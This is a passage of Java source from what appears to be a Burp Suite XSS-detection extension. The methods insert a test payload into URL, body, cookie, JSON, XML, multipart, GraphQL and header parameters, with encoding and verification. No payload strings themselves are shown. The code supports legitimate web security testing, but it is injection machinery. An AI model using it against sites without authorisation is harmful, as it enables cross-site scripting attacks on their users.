                    callbacks.printError("Unsupported parameter TYPE class: " + typeObj.getClass().getName());
                    return null;
                }
                
                paramName = (String) nameObj;
                originalValue = valueObj != null ? (String) valueObj : "";
                
            } catch (ClassCastException e) {
                callbacks.printError("Invalid parameter data types: " + e.getMessage());
                callbacks.printError("TYPE object class: " + (typeObj != null ? typeObj.getClass().getName() : "null"));
                callbacks.printError("NAME object class: " + (nameObj != null ? nameObj.getClass().getName() : "null"));
                callbacks.printError("VALUE object class: " + (valueObj != null ? valueObj.getClass().getName() : "null"));
                return null;
            }
            
            // Parameter replacement logging removed - too verbose
            
            // Handle different parameter types
            byte[] modifiedRequest;
            
            switch (paramType) {
                case IParameter.PARAM_URL:
                    // CRITICAL FIX: URL parameters MUST be URL-encoded
                    // Burp's buildParameter/updateParameter may decode or not preserve URL encoding
                    // We need to manually construct the URL-encoded parameter and replace it directly
                    try {
                        // CRITICAL: Check if payload is already URL-encoded
                        // Browsers send URL parameters already encoded, so we shouldn't double-encode
                        String urlEncodedPayload = payload;
                        
                        // Check if payload appears to be already URL-encoded
                        boolean isAlreadyEncoded = payload.contains("%") && 
                            (payload.matches(".*%[0-9A-Fa-f]{2}.*") || 
                             payload.contains("%3C") || payload.contains("%3E") || 
                             payload.contains("%20") || payload.contains("%22") || 
                             payload.contains("%27") || payload.contains("%26"));
                        
                        if (!isAlreadyEncoded) {
                            // Payload is not encoded - check if it needs encoding
                            // Only encode if it contains URL-unsafe characters that aren't already encoded
                            if (payload.contains("<") || payload.contains(">") || payload.contains(" ") || 
                                payload.contains("&") || payload.contains("=") || payload.contains("?") || 
                                payload.contains("#") || payload.contains("\"") || payload.contains("'")) {
                                // Check if these chars are already encoded
                                if (!payload.contains("%3C") && !payload.contains("%3E") && !payload.contains("%20") &&
                                    !payload.contains("%26") && !payload.contains("%3D") && !payload.contains("%3F") &&
                                    !payload.contains("%23") && !payload.contains("%22") && !payload.contains("%27")) {
                                    // Not encoded - URL-encode it
                                    urlEncodedPayload = helpers.urlEncode(payload);
                                    callbacks.printOutput("[XSSDetector] URL-encoding payload for URL parameter: " + paramName);
                                } else {
                                    // Already encoded - use as-is
                                    urlEncodedPayload = payload;
                                    callbacks.printOutput("[XSSDetector] Payload already URL-encoded, using as-is: " + paramName);
                                }
                            } else {
                                // No special chars - use as-is
                                urlEncodedPayload = payload;
                            }
                        } else {
                            // Already encoded - use as-is (browser already encoded it)
                            urlEncodedPayload = payload;
                            callbacks.printOutput("[XSSDetector] Payload appears already URL-encoded (contains %), using as-is: " + paramName);
                        }
                        
                        // Manually construct the URL-encoded parameter string
                        String requestStr = new String(request, StandardCharsets.UTF_8);
                        String encodedParamName = helpers.urlEncode(paramName);
                        
                        // Find and replace the parameter in the URL
                        // Pattern 1: ?paramName=value or &paramName=value
                        String pattern1 = "?" + paramName + "=";
                        String pattern2 = "&" + paramName + "=";
                        String pattern3 = "?" + encodedParamName + "=";
                        String pattern4 = "&" + encodedParamName + "=";
                        
                        // Find the parameter value (until & or end of line or space)
                        boolean replaced = false;
                        for (String pattern : new String[]{pattern1, pattern2, pattern3, pattern4}) {
                            int paramIndex = requestStr.indexOf(pattern);
                            if (paramIndex >= 0) {
                                int valueStart = paramIndex + pattern.length();
                                int valueEnd = valueStart;
                                // Find end of parameter value (next &, space, or end of line)
                                while (valueEnd < requestStr.length()) {
                                    char c = requestStr.charAt(valueEnd);
                                    if (c == '&' || c == ' ' || c == '\r' || c == '\n' || c == '\t') {
                                        break;
                                    }
                                    valueEnd++;
                                }
                                
                                // Replace the parameter value with URL-encoded payload
                                String before = requestStr.substring(0, valueStart);
                                String after = requestStr.substring(valueEnd);
                                requestStr = before + urlEncodedPayload + after;
                                replaced = true;
                                break; // Only replace first occurrence
                            }
                        }
                        
                        if (!replaced) {
                            // Parameter not found - try using Burp's method as fallback
                            IParameter newParam = helpers.buildParameter(paramName, urlEncodedPayload, (byte) paramType);
                            modifiedRequest = helpers.updateParameter(request, newParam);
                            // Verify encoding is preserved
                            String modifiedRequestStr = new String(modifiedRequest, StandardCharsets.UTF_8);
                            if (modifiedRequestStr.contains(payload) && !modifiedRequestStr.contains(urlEncodedPayload)) {
                                // Raw payload found but encoded not found - manually fix
                                modifiedRequestStr = modifiedRequestStr.replace(paramName + "=" + payload, paramName + "=" + urlEncodedPayload);
                                modifiedRequestStr = modifiedRequestStr.replace(encodedParamName + "=" + payload, encodedParamName + "=" + urlEncodedPayload);
                                modifiedRequest = modifiedRequestStr.getBytes(StandardCharsets.UTF_8);
                            }
                        } else {
                            modifiedRequest = requestStr.getBytes(StandardCharsets.UTF_8);
                        }
                        
                        // CRITICAL: Verify the URL-encoded payload is in the request
                        String finalRequestStr = new String(modifiedRequest, StandardCharsets.UTF_8);
                        if (!finalRequestStr.contains(urlEncodedPayload)) {
                            // Last resort: try to find and replace raw payload
                            if (finalRequestStr.contains(paramName + "=" + payload)) {
                                finalRequestStr = finalRequestStr.replace(paramName + "=" + payload, paramName + "=" + urlEncodedPayload);
                                modifiedRequest = finalRequestStr.getBytes(StandardCharsets.UTF_8);
                            } else if (finalRequestStr.contains(encodedParamName + "=" + payload)) {
                                finalRequestStr = finalRequestStr.replace(encodedParamName + "=" + payload, encodedParamName + "=" + urlEncodedPayload);
                                modifiedRequest = finalRequestStr.getBytes(StandardCharsets.UTF_8);
                            } else {
                                callbacks.printError("CRITICAL: URL-encoded payload not found in request after replacement");
                                callbacks.printError("Expected: " + urlEncodedPayload.substring(0, Math.min(50, urlEncodedPayload.length())));
                                callbacks.printError("Request preview: " + finalRequestStr.substring(0, Math.min(500, finalRequestStr.length())));
                                return null;
                            }
                        }
                        
                        // Verify raw payload is NOT in request (should be encoded)
                        String finalCheck = new String(modifiedRequest, StandardCharsets.UTF_8);
                        if (finalCheck.contains(paramName + "=" + payload) && !payload.equals(urlEncodedPayload)) {
                            callbacks.printOutput("WARNING: Raw payload still found in request, attempting final fix...");
                            finalCheck = finalCheck.replace(paramName + "=" + payload, paramName + "=" + urlEncodedPayload);
                            finalCheck = finalCheck.replace(encodedParamName + "=" + payload, encodedParamName + "=" + urlEncodedPayload);
                            modifiedRequest = finalCheck.getBytes(StandardCharsets.UTF_8);
                        }
                        
                        callbacks.printOutput("URL parameter '" + paramName + "' URL-encoded successfully");
                        
                    } catch (Exception e) {
                        callbacks.printError("Error updating URL parameter: " + e.getMessage());
                        return null;
                    }
                    break;
                    
                case IParameter.PARAM_BODY:
                    // Body parameters - handle multipart/form-data, JSON, GraphQL, and form-encoded
                    try {
                        IRequestInfo reqInfo = helpers.analyzeRequest(request);
                        String contentType = getRequestContentType(request);
                        String applicationType = (String) parameter.get("APPLICATION_TYPE");
                        String reflectionContext = (String) parameter.get("REFLECTION_CONTEXT");
                        
                        // CRITICAL: Check for GraphQL in body (application/graphql content type)
                        if (contentType != null && contentType.contains("application/graphql")) {
                            // GraphQL query in body - handle specially
                            modifiedRequest = updateGraphQLBody(request, parameter, payload);
                            if (modifiedRequest == null) {
                                callbacks.printError("Failed to update GraphQL body parameter");
                                return null;
                            }
                        }
                        // Check if this is multipart/form-data
                        else if (contentType != null && contentType.toLowerCase().contains("multipart/form-data")) {
                            modifiedRequest = updateMultipartParameter(request, parameter, payload);
                            if (modifiedRequest == null) {
                                callbacks.printError("Failed to update multipart parameter");
                                return null;
                            }
                        }
                        // Check if this is JSON body (application/json)
                        else if (contentType != null && contentType.contains("application/json")) {
                            // JSON body - use JSON parameter update
                            modifiedRequest = updateJSONParameter(request, parameter, payload);
                            if (modifiedRequest == null) {
                                callbacks.printError("Failed to update JSON body parameter");
                                return null;
                            }
                        }
                        // Standard form-encoded body parameter (application/x-www-form-urlencoded)
                        else {
                            // CRITICAL: For form-encoded, payload should be URL-encoded
                            String formEncodedPayload = helpers.urlEncode(payload);
                            IParameter newParam = helpers.buildParameter(paramName, formEncodedPayload, (byte) paramType);
                            modifiedRequest = helpers.updateParameter(request, newParam);
                            
                            // Verify the replacement worked - check for URL-encoded payload
                            String modifiedRequestStr = new String(modifiedRequest);
                            if (!modifiedRequestStr.contains(formEncodedPayload) && !modifiedRequestStr.contains(payload)) {
                                callbacks.printError("CRITICAL ERROR: Payload not found in modified request");
                                callbacks.printError("Expected payload: " + formEncodedPayload.substring(0, Math.min(50, formEncodedPayload.length())));
                                return null;
                            }
                            
                            callbacks.printOutput("SUCCESS: Body parameter replaced successfully (form-encoded)");
                        }
                        
                    } catch (Exception e) {
                        callbacks.printError("Error updating body parameter: " + e.getMessage());
                        return null;
                    }
                    break;
                    
                case IParameter.PARAM_COOKIE:
                    // Cookie parameters - use payload as-is (cookies are URL-encoded by browser)
                    try {
                        // Cookies should be URL-encoded for proper injection
                        String cookiePayload = helpers.urlEncode(payload);
                        IParameter newParam = helpers.buildParameter(paramName, cookiePayload, (byte) paramType);
                        modifiedRequest = helpers.updateParameter(request, newParam);
                        
                        // Verify the replacement worked
                        String modifiedRequestStr = new String(modifiedRequest);
                        if (!modifiedRequestStr.contains(cookiePayload) && !modifiedRequestStr.contains(payload)) {
                            callbacks.printError("CRITICAL ERROR: Cookie payload not found in modified request");
                            callbacks.printError("Expected payload: " + cookiePayload.substring(0, Math.min(50, cookiePayload.length())));
                            return null;
                        }
                        
                        callbacks.printOutput("SUCCESS: Cookie parameter replaced successfully");
                        
                    } catch (Exception e) {
                        callbacks.printError("Error updating cookie parameter: " + e.getMessage());
                        return null;
                    }
                    break;
                    
                case IParameter.PARAM_JSON:
                    // JSON parameter handling
                    modifiedRequest = updateJSONParameter(request, parameter, payload);
                    if (modifiedRequest == null) {
                        callbacks.printError("Failed to update JSON parameter");
                        return null;
                    }
                    break;
                    
                case IParameter.PARAM_XML:
                case IParameter.PARAM_XML_ATTR:
                    // XML parameter handling (SOAP, XML-RPC, etc.)
                    // PARAM_XML_ATTR is for XML attributes, handled similarly
                    modifiedRequest = updateXMLParameter(request, parameter, payload);
                    if (modifiedRequest == null) {
                        callbacks.printError("Failed to update XML parameter");
                        return null;
                    }
                    break;
                    
                case IParameter.PARAM_MULTIPART_ATTR:
                    // Multipart attribute parameter - handle as multipart
                    modifiedRequest = updateMultipartParameter(request, parameter, payload);
                    if (modifiedRequest == null) {
                        callbacks.printError("Failed to update multipart attribute parameter");
                        return null;
                    }
                    break;
                    
                // Note: Headers are not handled as IParameter types in Burp
                // Headers should be injected via header manipulation, not as parameters
                // This case is intentionally omitted - header injection should be handled separately
                    
                default:
                    callbacks.printOutput("Unsupported parameter type for advanced testing: " + paramType);
                    return null;
            }
            
            // CRITICAL FIX: Final verification that the request contains the payload (encoded or raw based on type)
            String finalRequest = new String(modifiedRequest, StandardCharsets.UTF_8);
            
            // For URL parameters, check for URL-encoded version
            if (paramType == IParameter.PARAM_URL) {
                String urlEncodedPayload = helpers.urlEncode(payload);
                if (!finalRequest.contains(urlEncodedPayload) && !finalRequest.contains(payload)) {
                    callbacks.printError("FINAL VERIFICATION FAILED: URL-encoded payload not in final request");
                    callbacks.printError("Expected encoded: " + urlEncodedPayload.substring(0, Math.min(50, urlEncodedPayload.length())));
                    callbacks.printError("Request preview: " + finalRequest.substring(0, Math.min(500, finalRequest.length())));
                    return null;
                }
                // If raw payload found but not encoded, try to fix it (but don't fail - Burp might handle encoding)
                if (finalRequest.contains(payload) && !finalRequest.contains(urlEncodedPayload) && !payload.equals(urlEncodedPayload)) {
                    callbacks.printOutput("WARNING: Raw payload found in URL parameter - attempting to fix encoding");
                    // Try one more fix
                    finalRequest = finalRequest.replace(paramName + "=" + payload, paramName + "=" + urlEncodedPayload);
                    modifiedRequest = finalRequest.getBytes(StandardCharsets.UTF_8);
                    // Don't fail - Burp's updateParameter might handle encoding differently
                }
            } else {
                // For non-URL parameters, check for raw payload
                if (!finalRequest.contains(payload)) {
                    callbacks.printError("FINAL VERIFICATION FAILED: Payload not in final request");
                    return null;
                }
            }
            
            // Payload verification passed
            return finalRequest;
            
        } catch (Exception e) {
            logError("Test Request Creation", e);
            return null;
        }
    }
    
    /**
     * Update JSON parameter with payload - FIXED REGEX ERROR
     */
    private byte[] updateJSONParameter(byte[] request, Map parameter, String payload) {
        try {
            int bodyOffset = helpers.analyzeRequest(request).getBodyOffset();
            String body = new String(Arrays.copyOfRange(request, bodyOffset, request.length));
            String paramName = (String) parameter.get(NAME);
            
            if (paramName == null || paramName.trim().isEmpty()) {
                callbacks.printError("Parameter name is null/empty for JSON update");
                return request;
            }
            
            // CRITICAL FIX: Proper JSON parameter replacement
            callbacks.printOutput("UPDATING JSON PARAMETER: " + paramName + " with payload: " + payload);
            
            // Find the parameter in JSON
            String searchPattern = "\"" + paramName + "\"";
            int paramIndex = body.indexOf(searchPattern);
            
            if (paramIndex == -1) {
                callbacks.printError("JSON parameter '" + paramName + "' not found in request body");
                return request;
            }
            
            // Find the value part after the parameter name
            int colonIndex = body.indexOf(":", paramIndex);
            if (colonIndex == -1) {
                callbacks.printError("No colon found after JSON parameter '" + paramName + "'");
                return request;
            }
            
            // Skip whitespace after colon
            int valueStart = colonIndex + 1;
            while (valueStart < body.length() && Character.isWhitespace(body.charAt(valueStart))) {
                valueStart++;
            }
            
            // Find the end of the current value
            int valueEnd = valueStart;
            char quoteChar = 0;
            boolean isQuoted = false;
            
            // Check if value is quoted
            if (valueStart < body.length() && body.charAt(valueStart) == '"') {
                quoteChar = '"';
                isQuoted = true;
                valueStart++; // Skip opening quote
                
                // Find closing quote (handle escaped quotes)
                int searchStart = valueStart;
                while (true) {
                    int quoteIndex = body.indexOf(quoteChar, searchStart);
                    if (quoteIndex == -1) {
                    callbacks.printError("No closing quote found for JSON parameter '" + paramName + "'");
                    return request;
                    }
                    // Check if quote is escaped
                    if (quoteIndex > 0 && body.charAt(quoteIndex - 1) == '\\') {
                        // Escaped quote - continue searching
                        searchStart = quoteIndex + 1;
                        continue;
                    }
                    valueEnd = quoteIndex;
                    break;
                }
            } else {
                // Find end of unquoted value (comma, brace, or bracket)
                while (valueEnd < body.length()) {
                    char c = body.charAt(valueEnd);
                    if (c == ',' || c == '}' || c == ']') {
                        break;
                    }
                    if (Character.isWhitespace(c) && valueEnd > valueStart) {
                        // Whitespace after value - stop
                        break;
                    }
                    valueEnd++;
                }
            }
            
            // CRITICAL FIX: Create the new JSON value with proper escaping
            String escapedPayload = payload.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n").replace("\r", "\\r").replace("\t", "\\t");
            
            // CRITICAL FIX: Properly replace the value
            // Always use quoted JSON string values
            int replaceStart, replaceEnd;
            if (isQuoted) {
                // Value was quoted - replace from opening quote to closing quote (inclusive)
                replaceStart = valueStart - 1; // Before the opening quote
                replaceEnd = valueEnd + 1; // After the closing quote
            } else {
                // Value was not quoted - replace the value itself
                replaceStart = valueStart;
                replaceEnd = valueEnd;
            }
            
            // Build new JSON body with properly quoted value
            String newBody = body.substring(0, replaceStart) + "\"" + escapedPayload + "\"" + body.substring(replaceEnd);
            
            // Reconstruct the full request
            byte[] header = Arrays.copyOfRange(request, 0, bodyOffset);
            byte[] newBodyBytes = newBody.getBytes(StandardCharsets.UTF_8);
            
            byte[] newRequest = new byte[header.length + newBodyBytes.length];
            System.arraycopy(header, 0, newRequest, 0, header.length);
            System.arraycopy(newBodyBytes, 0, newRequest, header.length, newBodyBytes.length);
            
            // CRITICAL FIX: Verify the replacement worked - check for escaped payload OR original payload
            String newRequestStr = new String(newRequest, StandardCharsets.UTF_8);
            // Check if either the escaped payload or original payload is in the request
            // (escaped payload will be in JSON, original might be in URL or elsewhere)
            boolean payloadFound = newRequestStr.contains(escapedPayload) || 
                                  newRequestStr.contains("\"" + escapedPayload + "\"") ||
                                  newRequestStr.contains(payload);
            
            // Also check if the parameter name is present (indicates JSON structure is intact)
            boolean paramNameFound = newRequestStr.contains("\"" + paramName + "\"");
            
            if (!payloadFound || !paramNameFound) {
                callbacks.printError("CRITICAL ERROR: Payload not found in JSON modified request");
                if (escapedPayload.length() > 0) {
                    callbacks.printError("Searched for: " + escapedPayload.substring(0, Math.min(50, escapedPayload.length())));
                }
                callbacks.printError("Parameter name found: " + paramNameFound);
                callbacks.printError("Payload found: " + payloadFound);
                // CRITICAL: Don't return original - try using Burp's parameter update instead
                try {
                    // Fallback: Use Burp's built-in parameter update
                    IRequestInfo reqInfo = helpers.analyzeRequest(request);
                    List<IParameter> params = reqInfo.getParameters();
                    for (IParameter param : params) {
                        if (param.getName().equals(paramName)) {
                            IParameter newParam = helpers.buildParameter(paramName, payload, IParameter.PARAM_JSON);
                            byte[] updatedRequest = helpers.updateParameter(request, newParam);
                            if (updatedRequest != null) {
                                String updatedStr = new String(updatedRequest, StandardCharsets.UTF_8);
                                if (updatedStr.contains(payload) || updatedStr.contains(escapedPayload)) {
                                    callbacks.printOutput("SUCCESS: Used Burp's parameter update as fallback");
                                    return updatedRequest;
                                }
                            }
                        }
                    }
                } catch (Exception e) {
                    callbacks.printError("Fallback parameter update failed: " + e.getMessage());
                }
                return request; // Return original if replacement failed
            }
            
            callbacks.printOutput("SUCCESS: JSON parameter replaced successfully");
            return newRequest;
            
        } catch (Exception e) {
            callbacks.printError("Error updating JSON parameter: " + e.getMessage());
            return request;
        }
    }
    
    /**
     * Update XML parameter with payload (SOAP, XML-RPC, etc.)
     */
    private byte[] updateXMLParameter(byte[] request, Map parameter, String payload) {
        try {
            int bodyOffset = helpers.analyzeRequest(request).getBodyOffset();
            String body = new String(Arrays.copyOfRange(request, bodyOffset, request.length), StandardCharsets.UTF_8);
            String paramName = (String) parameter.get(NAME);
            
            if (paramName == null || paramName.trim().isEmpty()) {
                callbacks.printError("Parameter name is null/empty for XML update");
                return request;
            }
            
            // CRITICAL: Proper XML escaping for payload
            // XML requires: < -> &lt;, > -> &gt;, & -> &amp;, " -> &quot;, ' -> &apos;
            String xmlEscapedPayload = payload.replace("&", "&amp;")
                                              .replace("<", "&lt;")
                                              .replace(">", "&gt;")
                                              .replace("\"", "&quot;")
                                              .replace("'", "&apos;");
            
            // Try to find and replace XML element or attribute
            // Pattern 1: <paramName>value</paramName>
            String elementPattern1 = "<" + paramName + ">";
            String elementPattern2 = "</" + paramName + ">";
            int elementStart = body.indexOf(elementPattern1);
            if (elementStart >= 0) {
                int valueStart = elementStart + elementPattern1.length();
                int valueEnd = body.indexOf(elementPattern2, valueStart);
                if (valueEnd > valueStart) {
                    // Replace element content
                    String newBody = body.substring(0, valueStart) + xmlEscapedPayload + body.substring(valueEnd);
                    byte[] header = Arrays.copyOfRange(request, 0, bodyOffset);
                    byte[] newBodyBytes = newBody.getBytes(StandardCharsets.UTF_8);
                    byte[] newRequest = new byte[header.length + newBodyBytes.length];
                    System.arraycopy(header, 0, newRequest, 0, header.length);
                    System.arraycopy(newBodyBytes, 0, newRequest, header.length, newBodyBytes.length);
                    callbacks.printOutput("SUCCESS: XML element parameter replaced successfully");
                    return newRequest;
                }
            }
            
            // Pattern 2: <element paramName="value">
            String attrPattern = paramName + "=\"";
            int attrIndex = body.indexOf(attrPattern);
            if (attrIndex >= 0) {
                int valueStart = attrIndex + attrPattern.length();
                int valueEnd = body.indexOf("\"", valueStart);
                if (valueEnd > valueStart) {
                    // Replace attribute value
                    String newBody = body.substring(0, valueStart) + xmlEscapedPayload + body.substring(valueEnd);
                    byte[] header = Arrays.copyOfRange(request, 0, bodyOffset);
                    byte[] newBodyBytes = newBody.getBytes(StandardCharsets.UTF_8);
                    byte[] newRequest = new byte[header.length + newBodyBytes.length];
                    System.arraycopy(header, 0, newRequest, 0, header.length);
                    System.arraycopy(newBodyBytes, 0, newRequest, header.length, newBodyBytes.length);
                    callbacks.printOutput("SUCCESS: XML attribute parameter replaced successfully");
                    return newRequest;
                }
            }
            
            // Fallback: Use Burp's parameter update
            try {
                IRequestInfo reqInfo = helpers.analyzeRequest(request);
                List<IParameter> params = reqInfo.getParameters();
                for (IParameter param : params) {
                    if (param.getName().equals(paramName)) {
                        // For XML, we need to escape the payload
                        IParameter newParam = helpers.buildParameter(paramName, xmlEscapedPayload, IParameter.PARAM_XML);
                        byte[] updatedRequest = helpers.updateParameter(request, newParam);
                        if (updatedRequest != null) {
                            String updatedStr = new String(updatedRequest, StandardCharsets.UTF_8);
                            if (updatedStr.contains(xmlEscapedPayload) || updatedStr.contains(payload)) {
                                callbacks.printOutput("SUCCESS: Used Burp's parameter update for XML");
                                return updatedRequest;
                            }
                        }
                    }
                }
            } catch (Exception e) {
                callbacks.printError("Fallback XML parameter update failed: " + e.getMessage());
            }
            
            callbacks.printError("XML parameter '" + paramName + "' not found in request body");
            return request;
            
        } catch (Exception e) {
            callbacks.printError("Error updating XML parameter: " + e.getMessage());
            return request;
        }
    }
    
    /**
     * Update HTTP header parameter with payload
     */
    private byte[] updateHeaderParameter(byte[] request, Map parameter, String payload) {
        try {
            IRequestInfo reqInfo = helpers.analyzeRequest(request);
            List<String> headers = new ArrayList<>(reqInfo.getHeaders());
            String paramName = (String) parameter.get(NAME);
            
            if (paramName == null || paramName.trim().isEmpty()) {
                callbacks.printError("Parameter name is null/empty for header update");
                return request;
            }
            
            // CRITICAL: Headers should NOT contain newlines or control characters
            // Some headers may need URL encoding, others may need HTML encoding
            // For XSS in headers, we typically inject into User-Agent, Referer, etc.
            String headerPayload = payload;
            
            // Remove newlines and control characters that break HTTP headers
            headerPayload = headerPayload.replace("\r", "").replace("\n", "").replace("\t", " ");
            
            // For certain headers, URL encode (e.g., Referer)
            if (paramName.toLowerCase().contains("referer") || 
                paramName.toLowerCase().contains("location") ||
                paramName.toLowerCase().contains("uri")) {
                headerPayload = helpers.urlEncode(payload);
            }
            
            // Find and replace header
            boolean headerFound = false;
            for (int i = 0; i < headers.size(); i++) {
                String header = headers.get(i);
                if (header.toLowerCase().startsWith(paramName.toLowerCase() + ":")) {
                    // Replace header value
                    int colonIndex = header.indexOf(":");
                    String headerName = header.substring(0, colonIndex + 1);
                    headers.set(i, headerName + " " + headerPayload);
                    headerFound = true;
                    break;
                }
            }
            
            if (!headerFound) {
                // Header not found - add it
                headers.add(paramName + ": " + headerPayload);
            }
            
            // Reconstruct request with new headers
            int bodyOffset = reqInfo.getBodyOffset();
            byte[] body = Arrays.copyOfRange(request, bodyOffset, request.length);
            
            // Build new request
            StringBuilder newRequest = new StringBuilder();
            IRequestInfo requestInfo = helpers.analyzeRequest(request);
            newRequest.append(requestInfo.getMethod()).append(" ").append(requestInfo.getUrl().toString()).append(" HTTP/1.1\r\n");
            for (String header : headers) {
                newRequest.append(header).append("\r\n");
            }
            newRequest.append("\r\n");
            
            byte[] newRequestBytes = newRequest.toString().getBytes(StandardCharsets.UTF_8);
            byte[] finalRequest = new byte[newRequestBytes.length + body.length];
            System.arraycopy(newRequestBytes, 0, finalRequest, 0, newRequestBytes.length);
            System.arraycopy(body, 0, finalRequest, newRequestBytes.length, body.length);
            
            // Verify payload is in headers
            String finalRequestStr = new String(finalRequest, StandardCharsets.UTF_8);
            if (finalRequestStr.contains(headerPayload) || finalRequestStr.contains(payload)) {
                callbacks.printOutput("SUCCESS: Header parameter replaced successfully");
                return finalRequest;
            } else {
                callbacks.printError("CRITICAL: Header payload not found after replacement");
                return request;
            }
            
        } catch (Exception e) {
            callbacks.printError("Error updating header parameter: " + e.getMessage());
            return request;
        }
    }
    
    /**
     * Update multipart/form-data parameter with payload
     */
    private byte[] updateMultipartParameter(byte[] request, Map parameter, String payload) {
        try {
            IRequestInfo reqInfo = helpers.analyzeRequest(request);
            List<String> headers = reqInfo.getHeaders();
            String contentType = null;
            String boundary = null;
            
            // Extract boundary from Content-Type header
            for (String header : headers) {
                if (header.toLowerCase().startsWith("content-type:")) {
                    contentType = header.substring("content-type:".length()).trim();
                    int boundaryIndex = contentType.toLowerCase().indexOf("boundary=");
                    if (boundaryIndex >= 0) {
                        boundary = contentType.substring(boundaryIndex + "boundary=".length()).trim();
                        // Remove quotes if present
                        if (boundary.startsWith("\"") && boundary.endsWith("\"")) {
                            boundary = boundary.substring(1, boundary.length() - 1);
                        }
                    }
                    break;
                }
            }
            
            if (boundary == null || boundary.isEmpty()) {
                callbacks.printError("Multipart boundary not found");
                return request;
            }
            
            int bodyOffset = reqInfo.getBodyOffset();
            String body = new String(Arrays.copyOfRange(request, bodyOffset, request.length), StandardCharsets.UTF_8);
            String paramName = (String) parameter.get(NAME);
            
            if (paramName == null || paramName.trim().isEmpty()) {
                callbacks.printError("Parameter name is null/empty for multipart update");
                return request;
            }
            
            // Find the multipart field for this parameter
            // Pattern: --boundary\r\nContent-Disposition: form-data; name="paramName"\r\n\r\nvalue\r\n
            String fieldPattern = "--" + boundary + "\r\nContent-Disposition: form-data; name=\"" + paramName + "\"";
            int fieldIndex = body.indexOf(fieldPattern);
            
            if (fieldIndex >= 0) {
                // Find the value section (after \r\n\r\n)
                int valueStart = body.indexOf("\r\n\r\n", fieldIndex);
                if (valueStart >= 0) {
                    valueStart += 4; // Skip \r\n\r\n
                    // Find the end of this field (next --boundary or end of body)
                    int valueEnd = body.indexOf("\r\n--" + boundary, valueStart);
                    if (valueEnd < 0) {
                        valueEnd = body.length();
                    }
                    
                    // Replace the value
                    String newBody = body.substring(0, valueStart) + payload + body.substring(valueEnd);
                    
                    // Reconstruct request
                    byte[] header = Arrays.copyOfRange(request, 0, bodyOffset);
                    byte[] newBodyBytes = newBody.getBytes(StandardCharsets.UTF_8);
                    byte[] newRequest = new byte[header.length + newBodyBytes.length];
                    System.arraycopy(header, 0, newRequest, 0, header.length);
                    System.arraycopy(newBodyBytes, 0, newRequest, header.length, newBodyBytes.length);
                    
                    // Verify payload is present
                    String newRequestStr = new String(newRequest, StandardCharsets.UTF_8);
                    if (newRequestStr.contains(payload)) {
                        callbacks.printOutput("SUCCESS: Multipart parameter replaced successfully");
                        return newRequest;
                    }
                }
            }
            
            // Fallback: Use Burp's parameter update
            try {
                IParameter newParam = helpers.buildParameter(paramName, payload, IParameter.PARAM_BODY);
                byte[] updatedRequest = helpers.updateParameter(request, newParam);
                if (updatedRequest != null) {
                    String updatedStr = new String(updatedRequest, StandardCharsets.UTF_8);
                    if (updatedStr.contains(payload)) {
                        callbacks.printOutput("SUCCESS: Used Burp's parameter update for multipart");
                        return updatedRequest;
                    }
                }
            } catch (Exception e) {
                callbacks.printError("Fallback multipart parameter update failed: " + e.getMessage());
            }
            
            callbacks.printError("Multipart parameter '" + paramName + "' not found");
            return request;
            
        } catch (Exception e) {
            callbacks.printError("Error updating multipart parameter: " + e.getMessage());
            return request;
        }
    }
    
    /**
     * Get request Content-Type header
     */
    /**
     * Update GraphQL body with payload - handles GraphQL queries, mutations, and variables
     */
    private byte[] updateGraphQLBody(byte[] request, Map parameter, String payload) {
        try {
            int bodyOffset = helpers.analyzeRequest(request).getBodyOffset();
            String body = new String(Arrays.copyOfRange(request, bodyOffset, request.length), StandardCharsets.UTF_8);
            String paramName = (String) parameter.get(NAME);
            
            if (paramName == null || paramName.trim().isEmpty()) {
                callbacks.printError("Parameter name is null/empty for GraphQL update");
                return request;
            }
            
            // CRITICAL: GraphQL can have payloads in:
            // 1. Query string (query { user(name: "payload") { id } })
            // 2. Variables ({"variables": {"name": "payload"}})
            // 3. Operation name
            
            // Check if this is a GraphQL variable (JSON format)
            if (body.contains("\"variables\"") || body.contains("variables")) {
                // GraphQL variables are JSON-encoded
                String jsonEscapedPayload = payload.replace("\\", "\\\\")
                                                   .replace("\"", "\\\"")
                                                   .replace("\n", "\\n")
                                                   .replace("\r", "\\r")
                                                   .replace("\t", "\\t");
                
                // Find and replace in variables JSON
                String varPattern = "\"" + paramName + "\"";
                int varIndex = body.indexOf(varPattern);
                if (varIndex >= 0) {
                    int colonIndex = body.indexOf(":", varIndex);
                    if (colonIndex >= 0) {
                        int valueStart = colonIndex + 1;
                        while (valueStart < body.length() && Character.isWhitespace(body.charAt(valueStart))) {
                            valueStart++;
                        }
                        
                        // Find end of value
                        int valueEnd = valueStart;
                        if (body.charAt(valueStart) == '"') {
                            // Quoted value
                            valueStart++;
                            valueEnd = body.indexOf("\"", valueStart);
                            if (valueEnd > valueStart) {
                                String newBody = body.substring(0, valueStart) + jsonEscapedPayload + body.substring(valueEnd);
                                byte[] header = Arrays.copyOfRange(request, 0, bodyOffset);
                                byte[] newBodyBytes = newBody.getBytes(StandardCharsets.UTF_8);
                                byte[] newRequest = new byte[header.length + newBodyBytes.length];
                                System.arraycopy(header, 0, newRequest, 0, header.length);
                                System.arraycopy(newBodyBytes, 0, newRequest, header.length, newBodyBytes.length);
                                callbacks.printOutput("SUCCESS: GraphQL variable replaced successfully");
                                return newRequest;
                            }
                        }
                    }
                }
            }
            
            // GraphQL query string - payload may need different encoding
            // GraphQL queries use double quotes for strings
            String graphqlEscapedPayload = payload.replace("\\", "\\\\")
                                                   .replace("\"", "\\\"")
                                                   .replace("\n", "\\n");
            
            // Try to find parameter in query string
            String queryPattern = paramName + ":";
            int queryIndex = body.indexOf(queryPattern);
            if (queryIndex >= 0) {
                // Find the value after colon
                int valueStart = queryIndex + queryPattern.length();
                while (valueStart < body.length() && Character.isWhitespace(body.charAt(valueStart))) {
                    valueStart++;
                }
                
                // GraphQL string values are in double quotes
                if (valueStart < body.length() && body.charAt(valueStart) == '"') {
                    valueStart++; // Skip opening quote
                    int valueEnd = body.indexOf("\"", valueStart);
                    if (valueEnd > valueStart) {
                        String newBody = body.substring(0, valueStart) + graphqlEscapedPayload + body.substring(valueEnd);
                        byte[] header = Arrays.copyOfRange(request, 0, bodyOffset);
                        byte[] newBodyBytes = newBody.getBytes(StandardCharsets.UTF_8);
                        byte[] newRequest = new byte[header.length + newBodyBytes.length];
                        System.arraycopy(header, 0, newRequest, 0, header.length);
                        System.arraycopy(newBodyBytes, 0, newRequest, header.length, newBodyBytes.length);
